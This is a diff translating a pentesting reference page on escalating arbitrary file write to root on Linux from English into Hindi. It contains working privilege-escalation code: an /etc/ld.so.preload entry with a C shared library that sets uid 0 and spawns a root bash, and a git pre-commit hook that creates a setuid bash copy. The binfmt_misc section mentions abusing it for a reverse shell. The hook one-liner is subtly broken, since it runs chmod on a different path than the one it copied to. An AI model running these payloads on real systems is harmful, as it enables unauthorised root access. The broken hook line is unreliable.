@@ -1,40 +1,36 @@
-# Arbitrary File Write to Root
+# रूट पर मनमाने फ़ाइल लेखन
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ### /etc/ld.so.preload
 
-This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
-If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.
+यह फ़ाइल **`LD_PRELOAD`** पर्यावरण चर की तरह व्यवहार करती है लेकिन यह **SUID बाइनरीज़** में भी काम करती है।\
+यदि आप इसे बना सकते हैं या संशोधित कर सकते हैं, तो आप बस एक **पथ जोड़ सकते हैं एक पुस्तकालय का जो प्रत्येक निष्पादित बाइनरी के साथ लोड होगा**।
 
-For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
-
+उदाहरण: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
 
 void _init() {
-    unlink("/etc/ld.so.preload");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
+unlink("/etc/ld.so.preload");
+setgid(0);
+setuid(0);
+system("/bin/bash");
 }
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) वे **स्क्रिप्ट** हैं जो एक git रिपॉजिटरी में विभिन्न **इवेंट्स** पर **चलती** हैं जैसे कि जब एक कमिट बनाया जाता है, एक मर्ज... तो यदि एक **विशिष्ट स्क्रिप्ट या उपयोगकर्ता** ये क्रियाएँ बार-बार कर रहा है और यदि **`.git` फोल्डर** में **लिखना संभव** है, तो इसका उपयोग **privesc** के लिए किया जा सकता है।
 
-For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
-
+उदाहरण के लिए, एक git रिपॉजिटरी में **`.git/hooks`** में एक **स्क्रिप्ट** उत्पन्न करना संभव है ताकि यह हमेशा नए कमिट के बनने पर चल सके:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-
 ### Cron & Time files
 
 TODO
@@ -45,6 +41,6 @@ TODO
 
 ### binfmt_misc
 
-The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
+फाइल `/proc/sys/fs/binfmt_misc` में यह संकेत दिया गया है कि कौन सा बाइनरी किस प्रकार की फाइलों को निष्पादित करना चाहिए। TODO: एक सामान्य फाइल प्रकार खुलने पर रिवर्स शेल निष्पादित करने के लिए इसका दुरुपयोग करने की आवश्यकताओं की जांच करें।
 
 {{#include ../../banners/hacktricks-training.md}}
